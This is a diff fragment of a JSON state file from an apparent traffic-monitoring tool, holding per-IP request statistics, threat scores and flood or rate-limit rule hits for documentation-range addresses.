+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.200": {
+      "ip": "198.51.100.200",
+      "first_seen": "2026-05-21T11:00:00",
+      "last_seen": "2026-05-21T11:08:24",
+      "total_requests": 3030,
+      "requests_by_status": {
+        "200": 2525
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 2525,
+      "attack_signatures_seen": [
+        "http_flood:ENDPOINT_FLOODING"
+      ],
+      "attack_categories_seen": [
+        "rate_limiting"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T11:08:24",
+          "category": "rate_limiting",
+          "rule_name": "http_flood:ENDPOINT_FLOODING",
+          "evidence": "Anonymous actor (src_ip=198.51.100.200, ua=other) flooded endpoint /login with 505 requests (thresho",
+          "batch_number": 8
+        },
+        {
+          "timestamp": "2026-05-21T11:08:24",
+          "category": "rate_limiting",
+          "rule_name": "http_flood:ENDPOINT_FLOODING",
+          "evidence": "Anonymous actor (src_ip=198.51.100.200, ua=other) flooded endpoint /login with 505 requests (thresho",
+          "batch_number": 9
+        },
+        {
+          "timestamp": "2026-05-21T11:08:24",
+          "category": "rate_limiting",
+          "rule_name": "http_flood:ENDPOINT_FLOODING",
+          "evidence": "Anonymous actor (src_ip=198.51.100.200, ua=other) flooded endpoint /login with 505 requests (thresho",
+          "batch_number": 10
+        },
+        {
+          "timestamp": "2026-05-21T11:08:24",
+          "category": "rate_limiting",
+          "rule_name": "http_flood:ENDPOINT_FLOODING",
+          "evidence": "Anonymous actor (src_ip=198.51.100.200, ua=other) flooded endpoint /login with 505 requests (thresho",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T11:08:24",
+          "category": "rate_limiting",
+          "rule_name": "http_flood:ENDPOINT_FLOODING",
+          "evidence": "Anonymous actor (src_ip=198.51.100.200, ua=other) flooded endpoint /login with 505 requests (thresho",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 505,
+          "timestamp": "2026-05-22T09:15:32.204987"
+        },
+        {
+          "batch": 8,
+          "count": 505,
+          "timestamp": "2026-05-22T09:20:34.500710"
+        },
+        {
+          "batch": 9,
+          "count": 505,
+          "timestamp": "2026-05-22T09:22:22.182486"
+        },
+        {
+          "batch": 10,
+          "count": 505,
+          "timestamp": "2026-05-22T09:30:32.846668"
+        },
+        {
+          "batch": 11,
+          "count": 505,
+          "timestamp": "2026-05-22T09:41:50.921820"
+        },
+        {
+          "batch": 12,
+          "count": 505,
+          "timestamp": "2026-05-22T09:44:40.632345"
+        }
+      ],
+      "threat_score": 1.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.201": {
+      "ip": "198.51.100.201",
+      "first_seen": "2026-05-21T12:00:00",
+      "last_seen": "2026-05-21T12:13:24",
+      "total_requests": 4830,
+      "requests_by_status": {
+        "200": 4025
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 4025,
+      "attack_signatures_seen": [
+        "http_flood:HTTP_FLOODING",
+        "http_flood:ENDPOINT_FLOODING",
+        "api_rate_abuse:API_ENDPOINT_ABUSE"
+      ],
+      "attack_categories_seen": [
+        "rate_limiting"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T12:13:24",
+          "category": "rate_limiting",
+          "rule_name": "http_flood:HTTP_FLOODING",
+          "evidence": "Anonymous actor (src_ip=198.51.100.201, ua=unknown) sent 805 requests across 0 endpoints (threshold=",
+          "batch_number": 7
+        },
+        {
+          "timestamp": "2026-05-21T12:13:24",
+          "category": "rate_limiting",
+          "rule_name": "http_flood:ENDPOINT_FLOODING",
+          "evidence": "Anonymous actor (src_ip=198.51.100.201, ua=other) flooded endpoint /api/search with 805 requests (th",
+          "batch_number": 8
+        },
+        {
+          "timestamp": "2026-05-21T12:13:24",
+          "category": "rate_limiting",
+          "rule_name": "http_flood:ENDPOINT_FLOODING",
+          "evidence": "Anonymous actor (src_ip=198.51.100.201, ua=other) flooded endpoint /api/search with 805 requests (th",
+          "batch_number": 9
+        },
+        {
+          "timestamp": "2026-05-21T12:13:24",
+          "category": "rate_limiting",
+          "rule_name": "http_flood:ENDPOINT_FLOODING",
+          "evidence": "Anonymous actor (src_ip=198.51.100.201, ua=other) flooded endpoint /api/search with 805 requests (th",
+          "batch_number": 10
+        },
+        {
+          "timestamp": "2026-05-21T12:13:24",
+          "category": "rate_limiting",
+          "rule_name": "http_flood:ENDPOINT_FLOODING",
+          "evidence": "Anonymous actor (src_ip=198.51.100.201, ua=other) flooded endpoint /api/search with 805 requests (th",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T12:13:24",
+          "category": "rate_limiting",
+          "rule_name": "api_rate_abuse:API_ENDPOINT_ABUSE",
+          "evidence": "API endpoint hammering from 198.51.100.201: 537 hits on group '/api/search' (threshold: 250)",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T12:13:24",
+          "category": "rate_limiting",
+          "rule_name": "http_flood:ENDPOINT_FLOODING",
+          "evidence": "Anonymous actor (src_ip=198.51.100.201, ua=other) flooded endpoint /api/search with 805 requests (th",
+          "batch_number": 12
+        },
+        {
+          "timestamp": "2026-05-21T12:13:24",
+          "category": "rate_limiting",
+          "rule_name": "api_rate_abuse:API_ENDPOINT_ABUSE",
+          "evidence": "API endpoint hammering from 198.51.100.201: 537 hits on group '/api/search' (threshold: 250)",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 805,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 805,
+          "timestamp": "2026-05-22T09:20:34.508707"
+        },
+        {
+          "batch": 9,
+          "count": 805,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 805,
+          "timestamp": "2026-05-22T09:30:32.849649"
+        },
+        {
+          "batch": 11,
+          "count": 805,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 805,
+          "timestamp": "2026-05-22T09:44:40.637665"
+        }
+      ],
+      "threat_score": 1.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.202": {
+      "ip": "198.51.100.202",
+      "first_seen": "2026-05-21T13:00:01",
+      "last_seen": "2026-05-21T13:00:05",
+      "total_requests": 30,
+      "requests_by_status": {
+        "200": 25
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 25,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 5,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 5,
+          "timestamp": "2026-05-22T09:20:34.508707"
+        },
+        {
+          "batch": 9,
+          "count": 5,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 5,
+          "timestamp": "2026-05-22T09:30:32.849649"
+        },
+        {
+          "batch": 11,
+          "count": 5,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 5,
+          "timestamp": "2026-05-22T09:44:40.637665"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.210": {
+      "ip": "198.51.100.210",
+      "first_seen": "2026-05-21T11:00:00",
+      "last_seen": "2026-05-21T11:00:24",
+      "total_requests": 150,
+      "requests_by_status": {
+        "200": 125
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 125,
+      "attack_signatures_seen": [
+        "rate_limiting_bypass_headers"
+      ],
+      "attack_categories_seen": [
+        "rate_limiting_bypass"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T11:00:00",
+          "category": "rate_limiting_bypass",
+          "rule_name": "rate_limiting_bypass_headers",
+          "evidence": "<134>May 21 11:00:00 web01 apache2: 10.10.10.5 198.51.100.210 - - [21/May/2026:11:00:00 +0000] \"GET ",
+          "batch_number": 7
+        },
+        {
+          "timestamp": "2026-05-21T11:00:00",
+          "category": "rate_limiting_bypass",
+          "rule_name": "rate_limiting_bypass_headers",
+          "evidence": "<134>May 21 11:00:00 web01 apache2: 10.10.10.5 198.51.100.210 - - [21/May/2026:11:00:00 +0000] \"GET ",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T11:00:00",
+          "category": "rate_limiting_bypass",
+          "rule_name": "rate_limiting_bypass_headers",
+          "evidence": "<134>May 21 11:00:00 web01 apache2: 10.10.10.5 198.51.100.210 - - [21/May/2026:11:00:00 +0000] \"GET ",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 25,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 25,
+          "timestamp": "2026-05-22T09:20:34.508707"
+        },
+        {
+          "batch": 9,
+          "count": 25,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 25,
+          "timestamp": "2026-05-22T09:30:32.849649"
+        },
+        {
+          "batch": 11,
+          "count": 25,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 25,
+          "timestamp": "2026-05-22T09:44:40.637665"
+        }
+      ],
+      "threat_score": 0.6000000000000001,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.211": {
+      "ip": "198.51.100.211",
+      "first_seen": "2026-05-21T11:00:00",
+      "last_seen": "2026-05-21T11:00:24",
+      "total_requests": 150,
+      "requests_by_status": {
+        "429": 125
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 25,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 25,
+          "timestamp": "2026-05-22T09:20:34.509227"
+        },
+        {
+          "batch": 9,
+          "count": 25,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 25,
+          "timestamp": "2026-05-22T09:30:32.849649"
+        },
+        {
+          "batch": 11,
+          "count": 25,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 25,
+          "timestamp": "2026-05-22T09:44:40.638660"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.212": {
+      "ip": "198.51.100.212",
+      "first_seen": "2026-05-21T11:00:00",
+      "last_seen": "2026-05-21T11:00:19",
+      "total_requests": 120,
+      "requests_by_status": {
+        "200": 100
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 100,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Slowloris"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 20,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 20,
+          "timestamp": "2026-05-22T09:20:34.512885"
+        },
+        {
+          "batch": 9,
+          "count": 20,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 20,
+          "timestamp": "2026-05-22T09:30:32.849649"
+        },
+        {
+          "batch": 11,
+          "count": 20,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 20,
+          "timestamp": "2026-05-22T09:44:40.638660"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.213": {
+      "ip": "198.51.100.213",
+      "first_seen": "2026-05-21T11:00:00",
+      "last_seen": "2026-05-21T11:00:29",
+      "total_requests": 180,
+      "requests_by_status": {
+        "200": 150
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 150,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "curl/7.88"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 30,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 30,
+          "timestamp": "2026-05-22T09:20:34.512885"
+        },
+        {
+          "batch": 9,
+          "count": 30,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 30,
+          "timestamp": "2026-05-22T09:30:32.849649"
+        },
+        {
+          "batch": 11,
+          "count": 30,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 30,
+          "timestamp": "2026-05-22T09:44:40.638660"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.214": {
+      "ip": "198.51.100.214",
+      "first_seen": "2026-05-21T11:00:00",
+      "last_seen": "2026-05-21T11:00:19",
+      "total_requests": 120,
+      "requests_by_status": {
+        "200": 100
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 100,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 20,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 20,
+          "timestamp": "2026-05-22T09:20:34.512885"
+        },
+        {
+          "batch": 9,
+          "count": 20,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 20,
+          "timestamp": "2026-05-22T09:30:32.849649"
+        },
+        {
+          "batch": 11,
+          "count": 20,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 20,
+          "timestamp": "2026-05-22T09:44:40.638660"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.220": {
+      "ip": "198.51.100.220",
+      "first_seen": "2026-05-21T15:00:01",
+      "last_seen": "2026-05-21T15:00:03",
+      "total_requests": 18,
+      "requests_by_status": {
+        "200": 15
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 15,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 3,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 3,
+          "timestamp": "2026-05-22T09:20:34.512885"
+        },
+        {
+          "batch": 9,
+          "count": 3,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 3,
+          "timestamp": "2026-05-22T09:30:32.850649"
+        },
+        {
+          "batch": 11,
+          "count": 3,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 3,
+          "timestamp": "2026-05-22T09:44:40.638660"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.221": {
+      "ip": "198.51.100.221",
+      "first_seen": "2026-05-21T15:00:01",
+      "last_seen": "2026-05-21T15:00:03",
+      "total_requests": 18,
+      "requests_by_status": {
+        "200": 15
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 15,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 3,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 3,
+          "timestamp": "2026-05-22T09:20:34.512885"
+        },
+        {
+          "batch": 9,
+          "count": 3,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 3,
+          "timestamp": "2026-05-22T09:30:32.850649"
+        },
+        {
+          "batch": 11,
+          "count": 3,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 3,
+          "timestamp": "2026-05-22T09:44:40.638660"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.222": {
+      "ip": "198.51.100.222",
+      "first_seen": "2026-05-21T15:00:01",
+      "last_seen": "2026-05-21T15:00:03",
+      "total_requests": 18,
+      "requests_by_status": {
+        "200": 15
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 15,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 3,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 3,
+          "timestamp": "2026-05-22T09:20:34.512885"
+        },
+        {
+          "batch": 9,
+          "count": 3,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 3,
+          "timestamp": "2026-05-22T09:30:32.850649"
+        },
+        {
+          "batch": 11,
+          "count": 3,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 3,
+          "timestamp": "2026-05-22T09:44:40.638660"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.223": {
+      "ip": "198.51.100.223",
+      "first_seen": "2026-05-21T15:00:01",
+      "last_seen": "2026-05-21T15:00:03",
+      "total_requests": 18,
+      "requests_by_status": {
+        "200": 15
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 15,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 3,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 3,
+          "timestamp": "2026-05-22T09:20:34.512885"
+        },
+        {
+          "batch": 9,
+          "count": 3,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 3,
+          "timestamp": "2026-05-22T09:30:32.850649"
+        },
+        {
+          "batch": 11,
+          "count": 3,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 3,
+          "timestamp": "2026-05-22T09:44:40.638660"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "198.51.100.224": {
+      "ip": "198.51.100.224",
+      "first_seen": "2026-05-21T15:00:01",
+      "last_seen": "2026-05-21T15:00:03",
+      "total_requests": 18,
+      "requests_by_status": {
+        "200": 15
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 15,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 3,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 3,
+          "timestamp": "2026-05-22T09:20:34.512885"
+        },
+        {
+          "batch": 9,
+          "count": 3,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 3,
+          "timestamp": "2026-05-22T09:30:32.850649"
+        },
+        {
+          "batch": 11,
+          "count": 3,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 3,
+          "timestamp": "2026-05-22T09:44:40.638660"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.250": {
+      "ip": "203.0.113.250",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.205986"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.512885"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.187484"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.850649"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.924823"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.638660"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    }
+  }
+}
